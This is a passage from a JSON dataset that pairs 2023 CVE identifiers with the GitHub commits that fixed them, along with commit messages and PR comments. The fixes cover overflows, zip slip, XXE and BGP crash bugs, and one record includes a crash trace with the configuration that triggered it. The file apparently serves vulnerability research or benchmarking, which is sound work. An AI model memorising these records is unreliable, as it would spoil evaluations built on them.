[...java/com/linecorp/armeria/server/ServerConfig.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL3NlcnZlci9TZXJ2ZXJDb25maWcuamF2YQ==) | `0.00% <\u00f8> (\u00f8)` | |\n| [...linecorp/armeria/server/UpdatableServerConfig.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL3NlcnZlci9VcGRhdGFibGVTZXJ2ZXJDb25maWcuamF2YQ==) | `89.28% <100.00%> (+0.39%)` | :arrow_up: |\n| [...c/main/java/com/linecorp/armeria/common/Flags.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL2NvbW1vbi9GbGFncy5qYXZh) | `74.42% <75.00%> (+<0.01%)` | :arrow_up: |\n| [...ava/com/linecorp/armeria/server/ServerBuilder.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL3NlcnZlci9TZXJ2ZXJCdWlsZGVyLmphdmE=) | `82.89% <62.50%> (+0.45%)` | :arrow_up: |\n\n... and [54 files with indirect coverage changes](https://app.codecov.io/gh/line/armeria/pull/5232/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line)\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line).\n \ud83d\udc4d \ud83d\udc4d \ud83d\udc4d",
            "pr_title_words": 9,
            "comments_words": 242,
            "total_other_info_words": 251
        },
        {
            "cve-id": "CVE-2023-38851",
            "commit_url": "https://github.com/libxls/libxls/commit/c009fa87fc775f8cc63e85d2018223143cb200e6",
            "commit_msg": "Fix buffer overflows when parsing style records\n\nCloses #124, #126.\n\nAccording to https://download.microsoft.com/download/5/0/1/501ED102-E53F-4CE0-AA6B-B0F93629DDC6/Office/Excel97-2007BinaryFileFormat(xls)Specification.pdf\na \"STYLE: Style Information (293h)\" record might be 4 or 3+ bytes\nlong, depending on the first word.\n\nWe need to check that we've read enough bytes for the whole\nrecord, so\n- first we check that we have a word at least,\n- then we check the subtype of the record.\n- If it is a built-in style, then it has 4 bytes, so we check that.\n- Otherwise the length of the name is in byte 3, so the whole record\n  is 3 + buf[3] bytes long. So we need at least three bytes before we\n  check the length in byte 3. Then we check if we have 3 + buf[3]\n  bytes.",
            "commit_msg_words": 127,
            "other_info": "Fix buffer overflows when parsing style records Perfect, thanks!! > Closes #124, #126.\r\n\r\nNote, you need to specify the trigger for both issues, so #126 didn't automatically close when this was merged.",
            "pr_title_words": 7,
            "comments_words": 25,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2023-31670",
            "commit_url": "https://github.com/WebAssembly/wabt/commit/1b3105a132b925a1d300c2f03b3cd213875ffca8",
            "commit_msg": "BinaryReader/BinaryReaderIR: add safety checks for missing end markers",
            "commit_msg_words": 8,
            "other_info": "BinaryReader/BinaryReaderIR: add safety checks for missing end markers in init expressions",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-23556",
            "commit_url": "https://github.com/facebook/hermes/commit/a6dcafe6ded8e61658b40f5699878cd19a481f80",
            "commit_msg": "Re-sync with internal repository (#908)\n\nFixes for CVE-2023-23556, and CVE-2023-24833.\r\n\r\nCo-authored-by: Facebook Community Bot <6422482+facebook-github-bot@users.noreply.github.com>",
            "commit_msg_words": 15,
            "other_info": "Re-sync with internal repository",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-47234",
            "commit_url": "https://github.com/FRRouting/frr/commit/c37119df45bbf4ef713bc10475af2ee06e12f3bf",
            "commit_msg": "bgpd: Ignore handling NLRIs if we received MP_UNREACH_NLRI\n\nIf we receive MP_UNREACH_NLRI, we should stop handling remaining NLRIs if\nno mandatory path attributes received.\n\nIn other words, if MP_UNREACH_NLRI received, the remaining NLRIs should be handled\nas a new data, but without mandatory attributes, it's a malformed packet.\n\nIn normal case, this MUST not happen at all, but to avoid crashing bgpd, we MUST\nhandle that.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 74,
            "other_info": "bgpd: A couple more bgpd crash fixes for malformed packets  @Mergifyio backport dev/9.1 > backport dev/9.1\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14735 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14735) has been created for branch `dev/9.1`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> Is there a plan for a stable/9.0 backport, too? @Mergifyio backport stable/9.0 > backport stable/9.0\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14861 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14861) has been created for branch `stable/9.0`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15930 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/15930) has been created for branch `stable/8.4` but encountered conflicts\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 10,
            "comments_words": 177,
            "total_other_info_words": 187
        },
        {
            "cve-id": "CVE-2023-34188",
            "commit_url": "https://github.com/cesanta/mongoose/commit/4663090a8fb036146dfe77718cff612b0101cb0f",
            "commit_msg": "Added check for negative value for HTTP Content-Length header",
            "commit_msg_words": 9,
            "other_info": "Added check for negative value for HTTP Content-Length header",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2023-50965",
            "commit_url": "https://github.com/starnight/MicroHttpServer/commit/2e5ff86102a973a1e3f7bedefd3bcf9bd510a9ca",
            "commit_msg": "Fix static file path's potential buffer overflow bug\n\nFixes: #5",
            "commit_msg_words": 10,
            "other_info": "Fix static file path's potential buffer overflow bug",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-39685",
            "commit_url": "https://github.com/hjson/hjson-java/commit/5f80339a8d4dd973c5c39e8241f112ba5c0b2600",
            "commit_msg": "fix out of bounds",
            "commit_msg_words": 4,
            "other_info": "Fix out of bounds",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-45239",
            "commit_url": "https://github.com/facebook/tac_plus/commit/68ba2a19472da0a3de28c41b7a2e222438dca359",
            "commit_msg": "add a validation function for author_data fields",
            "commit_msg_words": 7,
            "other_info": "Author data validation",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-26923",
            "commit_url": "https://github.com/musescore/MuseScore/commit/570e4775c3a4dfd4028bc69435bf043776cda6dc",
            "commit_msg": "Fix GH#16346: Stack buffer overflow vulnerability while parse MIDI file",
            "commit_msg_words": 10,
            "other_info": "Fix GH#16346: Stack buffer overflow vulnerability while parse MIDI file",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2023-46752",
            "commit_url": "https://github.com/FRRouting/frr/commit/b08afc81c60607a4f736f418f2e3eb06087f1a35",
            "commit_msg": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 137,
            "other_info": "bgpd: A couple more bgpd crashes on malformed attributes @Mergifyio backport dev/9.1 stable/9.0 stable/8.5 > backport dev/9.1 stable/9.0 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14653 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14653) has been created for branch `dev/9.1`\n* [#14654 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14654) has been created for branch `stable/9.0`\n* [#14655 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/14655) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1 stable/9.0 stable/8.5\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15929 bgpd: A couple more bgpd crashes on malformed attributes (backport #14645)](https://github.com/FRRouting/frr/pull/15929) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 9,
            "comments_words": 152,
            "total_other_info_words": 161
        },
        {
            "cve-id": "CVE-2023-25558",
            "commit_url": "https://github.com/datahub-project/datahub/commit/2a182f484677d056730d6b4e9f0143e67368359f",
            "commit_msg": "fix(pac4j-oidc): add verifier parameter (#6835)\n\n* fix(pac4j-oidc): add verifier parameter",
            "commit_msg_words": 10,
            "other_info": "fix(pac4j-oidc): add verifier parameter",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-48299",
            "commit_url": "https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb",
            "commit_msg": "fix zip slip error (#2634)",
            "commit_msg_words": 5,
            "other_info": "fix zip slip ## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2634](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b76e40d) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head b76e40d differs from pull request most recent head f206a65. Consider uploading reports for the commit f206a65 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2634      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2634/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We\u2019re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)",
            "pr_title_words": 3,
            "comments_words": 118,
            "total_other_info_words": 121
        },
        {
            "cve-id": "CVE-2023-35790",
            "commit_url": "https://github.com/libjxl/libjxl/commit/489b6b82a6ad27d563646d5d920d8d6bcadbc26b",
            "commit_msg": "Fix an integer underflow bug in patch decoding.\n\nWhen reading patches, the code doesn't properly check that all patches\nare in bounds.\n\nIn particular, if the start of a patch becomes negative (due to the\ndelta coding of patch positions), but not negative *enough* to cause\n`start + size` to still be negative, the decoder happily accepted the\npatch. Such a patch would then lead the interval tree building code to\nrun into an infinite loop.",
            "commit_msg_words": 76,
            "other_info": "Fix an integer underflow bug in patch decoding. Can the infinite loop behavior be triggered in 0.8.1? > Can the infinite loop behavior be triggered in 0.8.1?\r\n\r\nYep, we should release a patch release and/or backport this soon. FTR: this issue got CVE-2023-35790 assigned",
            "pr_title_words": 8,
            "comments_words": 36,
            "total_other_info_words": 44
        },
        {
            "cve-id": "CVE-2023-38406",
            "commit_url": "https://github.com/FRRouting/frr/commit/0b999c886e241c52bd1f7ef0066700e4b618ebb3",
            "commit_msg": "bgpd: Flowspec overflow issue\n\nAccording to the flowspec RFC 8955 a flowspec nlri is <length, <nlri data>>\nSpecifying 0 as a length makes BGP get all warm on the inside.  Which\nin this case is not a good thing at all.  Prevent warmth, stay cold\non the inside.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donald Sharp <sharpd@nvidia.com>",
            "commit_msg_words": 56,
            "other_info": "bgpd: Flowspec overflow issue @mergifyio backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1 > backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#12891 bgpd: Flowspec overflow issue (backport #12884)](https://github.com/FRRouting/frr/pull/12891) has been created for branch `dev/8.5`\n* [#12892 bgpd: Flowspec overflow issue (backport #12884)](https://github.com/FRRouting/frr/pull/12892) has been created for branch `stable/8.4`\n* [#12893 bgpd: Flowspec overflow issue (backport #12884)](https://github.com/FRRouting/frr/pull/12893) has been created for branch `stable/8.3`\n* [#12894 bgpd: Flowspec overflow issue (backport #12884)](https://github.com/FRRouting/frr/pull/12894) has been created for branch `stable/8.2`\n* [#12895 bgpd: Flowspec overflow issue (backport #12884)](https://github.com/FRRouting/frr/pull/12895) has been created for branch `stable/8.1`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/8.5 stable/8.4 stable/8.3 stable/8.2 stable/8.1\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n--> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9871/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.",
            "pr_title_words": 4,
            "comments_words": 167,
            "total_other_info_words": 171
        },
        {
            "cve-id": "CVE-2023-35862",
            "commit_url": "https://github.com/obgm/libcoap/commit/aaf5d6f8433989df3eab55083ce32267d3c562e7",
            "commit_msg": "coap_oscore.c: Fix ASan detected global-buffer-overflow bug",
            "commit_msg_words": 6,
            "other_info": "coap_oscore.c: Fix ASan detected global-buffer-overflow bug",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-23082",
            "commit_url": "https://github.com/xbmc/xbmc/commit/7e5f9fbf9aaa3540aab35e7504036855b23dcf60",
            "commit_msg": "ExifParse: Backport further upstream fixes\n\nPartially via upstream commit:\nhttps://android.googlesource.com/platform/external/jhead/+/2a4c12f5e5808e309b9ba04fe8b1539debf466d1",
            "commit_msg_words": 10,
            "other_info": "ExifParser: Fix several out of bounds accesses while parsing exif information",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-52339",
            "commit_url": "https://github.com/Matroska-Org/libebml/commit/d0a3db385b4744612824c67bb32e78c0acfaf409",
            "commit_msg": "MemIOCallback: fix buffer overflow when reading too much data\n\nIf the addition of 2 positive values is smaller than one of the values then we\nhave an overflowing addition.\n\nIn this case that means we are trying to read more data that is actually in\nour buffer. So we can use the same mechanism as reading too much data.",
            "commit_msg_words": 59,
            "other_info": "Fix MemIOCallback buffer overflows Poke @mbunkus  Given that all variables in that addition are unsigned, testing for overflow like this is OK. Looks good to me.\r\n\r\nI've also tested it by cherry-picking both commits on top of the `v1.x` branch which I'm still bundling in MKVToolNix & running my test suite, which completes just fine. Additionally I've verified that the provided sample program doesn't segfault anymore with a patched `v1.x` lib.\r\n\r\nYou can merge this. Please also cherry-pick & merge both commits onto the `v1.x` branch. We should then do another `v1.x` release soon afterwards. Hi, do you plan to request CVEs for these bugs? They look security-relevant Yes, they're security relevant. Personally I'm not interested in dealing with the bureaucracy of CVE. If Steve wants to handle it, he can, of course; or if anyone else does, go ahead. Steve let me know if you'll go on with the process, otherwise I can take care of it. Same here. I'd rather not deal with the CVE process. I just requested a CVE. I'll post it here for documentation purposes once it's assigned. FWIW, this is CVE-2023-52339 .",
            "pr_title_words": 4,
            "comments_words": 184,
            "total_other_info_words": 188
        },
        {
            "cve-id": "CVE-2023-0871",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/3c17231714e3d55809efc580a05734ed530f9ad4",
            "commit_msg": "NMS-15699: Prevent external xml entity loading",
            "commit_msg_words": 6,
            "other_info": "NMS-15699: Prevent external xml entity loading > another that should go back to `foundation-2023` or earlier if possible\r\n\r\nThis was just introduced in 2023 @RangerRick @christianpape Do we have a rough idea when this fix will be released? Since the defect was reported by external researchers, they are approaching for a timeframe of the release. Thanks! > Do we have a rough idea when this fix will be released? Since the defect was reported by external researchers, they are approaching for a timeframe of the release. Thanks!\r\n\r\n@qunhe it's merged, so it'll be in the normal monthly (2nd Wednesday of the month) release schedule, which means it should go out with the August 9th Meridian 2023 and Horizon 32 builds.\r\n\r\n(In general, if you see something has been merged, barring complications you can expect it will apply to the branch it was merged to and up, on the next 2nd Wednesday.) Readme need to update",
            "pr_title_words": 6,
            "comments_words": 149,
            "total_other_info_words": 155
        },
        {
            "cve-id": "CVE-2023-36812",
            "commit_url": "https://github.com/OpenTSDB/opentsdb/commit/07c4641471c6f5c2ab5aab615969e97211eb50d9",
            "commit_msg": "Improved fix for #2261.\nRegular expressions wouldn't catch the newlines or possibly other\ncontrol characters. Now we'll use the TAG validation code to make\nsure the inputs are only plain ASCII printables first.\nFixes CVE-2018-12972, CVE-2020-35476",
            "commit_msg_words": 36,
            "other_info": "Improved fix for #2261. @manolama - this seems to fix the [RCE we reported](https://github.com/OpenTSDB/opentsdb/issues/2261) before Synopsis on Dec 12, 2022. Seems like they have also issued a CVE for the vulnerability we found. Could you please open a Github security advisory? Thanks.",
            "pr_title_words": 4,
            "comments_words": 38,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2023-33975",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/1aeb90ee5555ae78b567a6365ae4ab71bfd1404b",
            "commit_msg": "gnrc_sixlowpan_frag_rb: fix OOB write in _rbuf_add",
            "commit_msg_words": 6,
            "other_info": "gnrc_sixlowpan_frag_rb: fix OOB write in _rbuf_add ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci.riot-os.org/details/5989d604a90345919798d1bc614dc4f1)\n\n1aeb90ee5555ae78b567a6365ae4ab71bfd1404b gnrc_sixlowpan_frag_rb: fix OOB write in _rbuf_add\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 6933 | 0 | 6933 | 12m:03s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci.riot-os.org/results/5989d604a90345919798d1bc614dc4f1/doc-preview/)\n bors merge This PR was included in a batch that was canceled, it will be automatically retried   Build succeeded!\n\n  The publicly hosted instance of bors-ng is deprecated and will go away soon.\n\n  If you want to self-host your own instance, [instructions are here][instructions].\n  For more help, visit [the forum].\n\n  If you want to switch to GitHub's built-in merge queue, visit [their help page][gh].\n\n  [instructions]: https://github.com/bors-ng/bors-ng#how-to-set-up-your-own-real-instance\n  [the forum]: https://forum.bors.tech\n  [gh]: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue\n\n\n\n  * [Murdock](https://ci.riot-os.org/details/fb540a7fea3d482dbf15b594aaf08a39)\n  * [static-tests](https://github.com/RIOT-OS/RIOT/actions/runs/5124347194/jobs/9216073113)\n  * [tools-build-success](https://github.com/RIOT-OS/RIOT/actions/runs/5124347197/jobs/9216103309)",
            "pr_title_words": 6,
            "comments_words": 120,
            "total_other_info_words": 126
        },
        {
            "cve-id": "CVE-2023-3040",
            "commit_url": "https://github.com/cloudflare/lua-resty-json/commit/3ef9492bd3a44d9e51301d6adc3cd1789c8f534a",
            "commit_msg": "Fix out-of-bounds read in debug dump_obj function\n\nThe read of `reverse_nesting_order` was unconditional regardless\nof whether the object was really a composite object or not.",
            "commit_msg_words": 25,
            "other_info": "Fix out-of-bounds read in debug dump_obj function",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-7171",
            "commit_url": "https://github.com/201206030/novel-plus/commit/d6093d8182362422370d7eaf6c53afde9ee45215",
            "commit_msg": "fix(novel-admin): \u53cb\u60c5\u94fe\u63a5URL\u683c\u5f0f\u6821\u9a8c",
            "commit_msg_words": 2,
            "other_info": "merge",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2023-42799",
            "commit_url": "https://github.com/moonlight-stream/moonlight-common-c/commit/02b7742f4d19631024bd766bd2bb76715780004e",
            "commit_msg": "Fix buffer overflow in parseUrlAddrFromRtspUrlString (CVE-2023-42799)",
            "commit_msg_words": 6,
            "other_info": "Fix for buffer overflows in RTSP parsing",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-26769",
            "commit_url": "https://github.com/liblouis/liblouis/commit/d45430431f8c75941f863328eb3f7fc09f902b2e",
            "commit_msg": "Check the path length before coping into tableFile",
            "commit_msg_words": 8,
            "other_info": "Check the path length before coping into tableFile",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-41361",
            "commit_url": "https://github.com/FRRouting/frr/commit/b4d09af9194d20a7f9f16995a062f5d8e3d32840",
            "commit_msg": "bgpd: Check the length of the rcv software version\n\nMake sure we don't exceed the maximum of BGP_MAX_SOFT_VERSION.\n\nThe Capability Length SHOULD be no greater than 64.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 35,
            "other_info": "bgpd: Check the length of the rcv software version @Mergifyio backport stable/9.0 > backport stable/9.0\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14250 bgpd: Check the length of the rcv software version (backport #14241)](https://github.com/FRRouting/frr/pull/14250) has been created for branch `stable/9.0`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13678/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 9\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 2\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 arm8 part 9\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 i386 part 6\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 amd64 part 7\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 3\n- Addresssanitizer topotests part 7\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 i386 part 0\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests debian 10 amd64 part 1\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 2\n- Static analyzer (clang)\n- Topotests Ubuntu 18.04 i386 part 5\n- Ubuntu 18.04 deb pkg check\n- Debian 9 deb pkg check\n- Topotests debian 10 amd64 part 5\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13679/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 9\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 2\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 8\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 arm8 part 9\n- Topotests Ubuntu 18.04 